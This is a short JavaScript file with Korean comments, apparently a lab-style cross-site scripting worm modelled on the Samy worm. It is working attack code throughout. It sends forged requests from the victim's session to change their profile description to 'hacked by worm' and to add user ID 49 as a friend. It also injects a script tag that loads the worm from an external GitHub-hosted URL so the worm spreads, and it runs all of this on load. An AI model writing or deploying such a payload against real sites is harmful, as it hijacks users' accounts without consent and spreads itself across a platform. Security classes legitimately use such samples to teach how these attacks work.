// 피해자의 프로필을 수정하고 악의적인 내용을 추가하는 함수
function modifyProfile() {
    var desc = encodeURIComponent("hacked by worm"); // 피해자의 프로필에 입력될 내용
    var content = "description=" + desc; // 리퀘스트를 구성하는 매개변수 입력

    var Ajax = new XMLHttpRequest();
    Ajax.open("POST", "/action/profile/edit", true);
    Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    Ajax.send(content);
}

// 피해자를 "Samy"라는 사용자의 친구로 추가하는 함수
function addFriend() {
    var friendId = 49; // Samy의 사용자 ID
    var content = "friend=" + friendId;

    var Ajax = new XMLHttpRequest();
    Ajax.open("POST", "/action/friends/add", true);
    Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    Ajax.send(content);
}

// 자신과 동일한 웜을 피해자의 프로필에 추가하여 전파될 수 있도록 하는 함수
function propagateWorm() {
    var wormScript = document.createElement('script');
    wormScript.src = 'https://raw.githubusercontent.com/namminju/worm_/main/xss_worm.js'; // 외부 스크립트의 URL
    document.body.appendChild(wormScript); // 웜을 피해자의 프로필에 추가하여 전파시킴
}

// 위의 함수들을 호출하여 피해자의 프로필을 수정하고 악성 스크립트를 전파하는 함수
function propagateMaliciousContent() {
    modifyProfile(); // 피해자의 프로필을 수정하고 악의적인 내용을 추가
    addFriend(); // 피해자를 "Samy"라는 사용자의 친구로 추가
    propagateWorm(); // 자신과 동일한 웜을 피해자의 프로필에 추가하여 전파될 수 있도록 함
}

// 스크립트 실행
propagateMaliciousContent();
